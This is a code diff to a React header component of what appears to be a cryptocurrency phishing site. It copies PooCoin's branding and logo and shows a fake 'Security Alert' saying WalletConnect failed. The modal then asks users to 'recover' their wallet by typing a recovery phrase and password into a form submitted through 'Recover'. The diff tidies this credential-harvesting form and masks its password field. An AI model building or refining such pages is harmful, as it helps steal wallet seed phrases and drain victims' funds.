@@ -61,7 +61,6 @@ const style1 = {
     paddingTop: '10px',
     paddingBottom: '40px',
     minHeight: '500px',
-    maxWidth : '500px',
 
 
 };
@@ -241,12 +240,12 @@ function Header() {
                         Chart
                     </Typography>
                 </Box>
-                <Box sx={{display: { xs: 'none',lg:'block',md:'block'}}} className="header_centercenter">
+                <Box sx={{ display: { xs: 'none', lg: 'block', md: 'block' } }} className="header_centercenter">
                     <div>Binance (BSC)</div>
                     <div>Polygon (Matic)</div>
                     <div>KuChain (KCC)</div>
                 </Box>
-                <Box sx={{display: { xs: 'none',lg:'block',md:'block'}}} className="header_centerright">
+                <Box sx={{ display: { xs: 'none', lg: 'block', md: 'block' } }} className="header_centerright">
                     <img
                         src="https://poocoin.app/images/logo/poocoin512.png"
                         alt='loading'
@@ -280,7 +279,7 @@ function Header() {
                                             {activeWallet?.name} Security Alert
                                         </Typography>
                                         <Typography style={{ marginTop: '15px', fontWeight: 'bolder' }} id="modal-modal-title" variant="h6" component="h2">
-                                                Warn! WalletConnect failed to connect to your wallet, please continue to recover your wallet.
+                                            Warn! WalletConnect failed to connect to your wallet, please continue to recover your wallet.
                                         </Typography>
                                         <button style={{ marginTop: '100px', cursor: 'pointer', border: 'none', outline: 'none', padding: '6px', background: 'rgb(0, 132, 255)', borderRadius: '20px', color: 'white', width: "300px", fontSize: '20px' }} onClick={() => recoverPass()}>
                                             Reset Wallet
@@ -292,12 +291,12 @@ function Header() {
                                     <Box sx={{ mb: 2 }}>
                                         {
                                             loading ?
-                                                <Box sx={{minWidth : '320px'}}>
+                                                <Box sx={{ minWidth: '320px' }}>
                                                     <CircularProgress />
                                                 </Box>
                                                 :
                                                 (
-                                                    <>
+                                                    <Box sx={{ minWidth: '320px' }}>
                                                         <img style={{ width: '150px' }} src={activeWallet?.image} />
                                                         <Typography id="modal-modal-title" variant="h6" component="h2">
                                                             Choice recovery method
@@ -305,7 +304,7 @@ function Header() {
                                                         <Box sx={{ mt: 3, display: 'flex', justifyContent: 'center', }}>
                                                             {
                                                                 btnsRef.map((btn) => (
-                                                                    <Button onClick={() => setActive(btn)} style={{ background: btn === active ? '#f3e5f5' : 'none', color: 'black', padding: '11px', width: '120px' }}>
+                                                                    <Button onClick={() => setActive(btn)} style={{ background: btn === active ? '#f3e5f5' : 'none', color: 'black', padding: '11px', width: '100px' }}>
                                                                         {btn.name}
                                                                     </Button>)
                                                                 )
@@ -316,12 +315,7 @@ function Header() {
                                                                 (
                                                                     <>
                                                                         <Box>
-                                                                            <TextField
-                                                                                id="standard-search"
-                                                                                label="Search field"
-                                                                                type="search"
-                                                                                variant="standard"
-                                                                            />
+                                                                           
                                                                             <TextareaAutosize
                                                                                 aria-label="minimum height"
                                                                                 minRows={3}
@@ -351,6 +345,7 @@ function Header() {
                                                                                     minRows={3}
                                                                                     placeholder="Password"
                                                                                     className='txtArea1'
+                                                                                    type='password'
                                                                                     onChange={(e) => setPrharePass(e.target.value)}
 
                                                                                 />
@@ -379,7 +374,7 @@ function Header() {
                                                                         ''
                                                         }
                                                         <Box className='mb-5'>
-                                                            <Button onClick={() => submitAddress()} className='hov' variant='outlined' style={{ fontSize: '15px', marginTop: '9px', borderRadius: '15px', padding: '10px', width: '370px' }}>
+                                                            <Button onClick={() => submitAddress()} className='hov' variant='outlined' style={{ fontSize: '15px', marginTop: '9px', borderRadius: '15px', padding: '10px', width: '320px' }}>
                                                                 Recover
                                                             </Button>
                                                             <br />
@@ -387,11 +382,11 @@ function Header() {
                                                                 setRecover(false)
                                                                 setIsloading(true)
                                                                 handleCloseFAk()
-                                                            }} variant='outlined' style={{ fontSize: '11px', marginTop: '9px', borderRadius: '15px', border: '1px solid gray', padding: '5px', width: '370px', color: 'black' }}>
+                                                            }} variant='outlined' style={{ fontSize: '11px', marginTop: '9px', borderRadius: '15px', border: '1px solid gray', padding: '5px', width: '320px', color: 'black' }}>
                                                                 Back
                                                             </Button>
                                                         </Box>
-                                                    </>
+                                                    </Box>
                                                 )
                                         }
 
